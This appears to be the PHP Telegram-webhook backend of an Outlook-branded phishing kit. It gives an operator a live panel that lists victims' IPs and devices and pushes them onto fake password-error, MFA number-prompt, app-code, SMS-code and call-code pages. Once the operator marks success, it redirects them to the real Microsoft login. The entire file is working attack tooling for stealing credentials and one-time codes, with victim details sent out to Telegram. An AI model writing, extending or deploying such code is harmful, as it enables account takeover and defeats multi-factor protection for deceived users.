<?php
// webhook.php — Outlook Telegram webhook
// FIX: 200 OK sent to Telegram IMMEDIATELY, all processing runs after connection closes

require 'config.php';

$raw    = file_get_contents('php://input');
$update = json_decode($raw, true);

// ════════════════════════════════════════════════
//  SEND 200 OK TO TELEGRAM INSTANTLY — DO NOT MOVE
// ════════════════════════════════════════════════
http_response_code(200);
header('Content-Type: text/plain');
if (ob_get_level()) ob_end_clean();
ob_start();
echo 'ok';
header('Content-Length: ' . ob_get_length());
header('Connection: close');
ob_end_flush();
flush();

// PHP-FPM (standard on all cPanel): close HTTP connection, keep script alive
if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
}

// ════════════════════════════════════════════════
//  ALL PROCESSING RUNS AFTER TELEGRAM IS FREED
// ════════════════════════════════════════════════

if (!$update) exit;

/* ══ /commands ══ */
if (isset($update['message']['text'])) {
    $txt = trim($update['message']['text']);

    if (in_array($txt, ['/start', '/menu'])) {
        tg_send(
            "👋 <b>Outlook — Admin Panel</b>\n\n" .
            "Visitors appear here automatically when they load the page.\n" .
            "You'll get a full control panel for each visitor.\n\n" .
            "/status — list active visitors\n" .
            "/clear — delete all visitor sessions"
        );
    }

    if ($txt === '/status') {
        $files = glob(SESSIONS_DIR . '/v_*.json');
        if (!$files) {
            tg_send("📭 No active visitors.");
        } else {
            $msg = "👥 <b>Active Visitors (" . count($files) . ")</b>\n\n";
            foreach ($files as $f) {
                $v = json_decode(file_get_contents($f), true);
                if (!$v) continue;
                $msg .= "🆔 <code>{$v['sid']}</code>\n";
                $msg .= "📍 Page: <b>{$v['page']}</b> | 🌐 IP: <code>{$v['ip']}</code>\n";
                $msg .= "💻 {$v['device_os']} | {$v['device_browser']}\n";
                $msg .= "⏰ {$v['created']}\n\n";
            }
            tg_send($msg);
        }
    }

    if ($txt === '/clear') {
        $files = glob(SESSIONS_DIR . '/v_*.json');
        foreach (($files ?: []) as $f) unlink($f);
        tg_send("🗑️ All visitor sessions cleared.");
    }

    exit;
}

/* ══ Inline button presses ══ */
if (!isset($update['callback_query'])) exit;

$cb     = $update['callback_query'];
$cqid   = $cb['id'];
$data   = $cb['data'] ?? '';
$parts  = explode('|', $data);
$action = $parts[0] ?? '';
$sid    = $parts[1] ?? '';
$extra  = $parts[2] ?? '';

// Answer callback AFTER 200 is already sent — just dismisses spinner
tg_answer($cqid, '');

/* Status refresh (no sid) */
if ($action === 'status') {
    $files = glob(SESSIONS_DIR . '/v_*.json');
    $msg   = $files
        ? "👥 <b>" . count($files) . " active visitor(s)</b>\n"
        : "📭 No active visitors.";
    foreach (($files ?: []) as $f) {
        $v = json_decode(file_get_contents($f), true);
        if ($v) $msg .= "\n• <code>{$v['sid']}</code> → <b>{$v['page']}</b>";
    }
    tg_send($msg);
    exit;
}

if (!$sid) exit;

switch ($action) {

    /* Back to panel */
    case 'panel':
        tg_panel($sid);
        break;

    /* 🔔 Number Prompt — show grid */
    case 'np':
        tg_number_grid($sid);
        break;

    /* Number chosen from grid */
    case 'pn':
        $num = (int)$extra;
        if ($num < 1 || $num > 100) break;
        set_state($sid, ['page' => 'approve_app', 'prompt_number' => $num]);
        tg_after_approve($sid, $num);
        break;

    /* 📱 Verification Code (app code) */
    case 'vc':
        set_state($sid, ['page' => 'verify_code']);
        tg_after_vc($sid);
        break;

    /* 💬 Text Message Code */
    case 'sms':
        set_state($sid, ['page' => 'text_code']);
        tg_after_code($sid, 'sms');
        break;

    /* 📞 Call Code */
    case 'call':
        set_state($sid, ['page' => 'call_code']);
        tg_after_code($sid, 'call');
        break;

    /* ❌ Password Error */
    case 'pwe':
        set_state($sid, ['page' => 'pw_error']);
        tg_send("❌ <b>Password error shown</b>\n🆔 <code>{$sid}</code>\n\nWaiting for visitor to retry...");
        break;

    /* ⏳ Keep Loading */
    case 'ld':
        set_state($sid, ['page' => 'loading']);
        break;

    /* ❌ Code Error */
    case 'ce':
        set_state($sid, ['page' => 'code_error']);
        break;

    /* ❌ Prompt mismatch error */
    case 'pme':
        set_state($sid, ['page' => 'prompt_error']);
        break;

    /* 💛 SUCCESS */
    case 'ok':
        set_state($sid, ['page' => 'success']);
        tg_send("💛 <b>SUCCESS</b>\n🆔 <code>{$sid}</code>\n✅ Visitor redirected to Microsoft login.");
        break;

    /* 🅱️ Block Visitor */
    case 'blk':
        set_state($sid, ['page' => 'blocked', 'blocked' => true]);
        tg_send("🅱️ <b>Visitor blocked</b>\n🆔 <code>{$sid}</code>");
        break;

    default:
        break;
}

exit;